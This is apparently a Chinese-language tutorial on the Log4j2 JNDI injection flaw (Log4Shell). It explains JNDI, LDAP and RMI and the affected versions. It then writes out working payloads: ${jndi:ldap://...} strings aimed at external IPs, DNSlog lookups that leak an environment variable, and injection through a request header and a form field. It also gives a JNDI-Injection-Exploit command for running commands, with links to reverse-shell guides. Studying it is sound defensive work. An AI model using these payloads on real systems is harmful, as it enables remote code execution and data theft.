Log4j2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写。并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。
由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。

^
## **JNDI注入**
JNDI是对各种访问目录服务的逻辑进行了再封装。
JNDI提供了一个通用的接口，使得Java应用程序可以查找和访问各种不同类型的命名服务和目录服务，包括文件系统、配置文件、DNS、LDAP服务器、RMI服务器等。
^
JNDI注入主要是用过下载远程class，来运行恶意代码。JNDI注入攻击时常用的就是通过RMI和LDAP两种服务，验证时也可以使用dns协议。
>LDAP（轻型目录访问协议）：是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象Linux/Unix系统中的文件目录一样。
>RMI（远程方法调用）：它是一种机制，能够让在某个java虚拟机上的对象调用另一个Java虚拟机 的对象的方法。
^
## **Log4j2漏洞原理**
在java中最常用的日志框架是log4j2和logback，其中log4j2支持lookup功能（查找搜索），例如开发者想在日志中打印今天的日期，则只需要输出 ${data:MM-dd-yy}，此时log4j会将${}中包裹的内容单独处理，将它识别为日期查找，然后将该表达式替换为今天的日期内容输出为"08-22-2022”，这样做就不需要开发者自己去编写查找日期的代码。然而lookup功能也允许在日志配置中引用远程JNDI资源，用来动态获取配置信息，比如从远程服务器获取信息字节流。
Log4j2 漏洞利用：攻击者使用 ${} 关键标识符触发 JNDI 注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞。此时攻击者构造一个特殊的JNDI URL，该URL指向一个远程服务器上的恶意LDAP服务。这个LDAP服务会返回一个恶意的类路径（类加载器链），最终导致远程服务器上的恶意类被加载和执行。
支持版本：2.0<=Log4j2<=2.14.1
^
## **漏洞利用和验证**
漏洞验证：
将用户名记录了日志中，
将用户的发言消息记录了日志中等
```
如：文件上传的名字记录日志
java代码：logger.info("获取图片原始文件名：{}”，originalFileName);
抓包把文件名改为：filename="${jndi:dns://***.dnslog.cn}"
成功获取DNSlog
获取java环境变量的操作系统OS：filename="${jndi:dns://${env:OS}.vmfp3r.dnslog.cn}"
```

对应的请求包中对应内容改为：
```
${jndi:ldap://183.145.120.145/Click1/Exec}  
//去请求一个LDAP服务器，域名的话也会请求DNS

${jndi:dns://***.dnslog.cn/exp}  
 //如果tcp不出网ldap失效，直接用dns协议(jndi支持dns://)去实现dnslog。


Accept-Language: zh-cN,zh;q=0.9
X-Api-Version: ${jndi:ldap://test.x****r.ceye.io/exp}
Content-Type: application/x-www-form-urlencoded
Content-Length:64
w-------------------+
username=admin${jndi : dns: //test.x****r.ceye.io/exp}
```
命令执行漏洞利用：
JNDI利用工具：LDAP服务器
工具使用方法参考<https://www.freebuf.com/vuls/337333.html>
实现：${jndi:ldap://127.0.0.1:1389/Basic/Command/你要执行的命令}

^
JNDI利用工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
jndi进行命令执行，反弹shell：<https://blog.csdn.net/m0_74294234/article/details/137188160>
支持同时启动ldap服务和rmi服务。
```
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C alc.exe" -A 47.109.58.205

${jndi:rmi://192.168.1.8:1099/yfwrr7}
${jndi:ldap://192.168.1.8:2113/akndj}
```

^
**log4j2不出网：**
rmi和ladp都是走的tcp协议，如果有网络防火墙tcp不出网，还想利用，将其转成icmp协议出网再转回来。
验证则直接用dns协议(jndi支持dns://)去实现dnslog：${jndi:dns://***.dnslog.cn/exp} 。

^
复现：
<https://www.freebuf.com/articles/web/341857.html>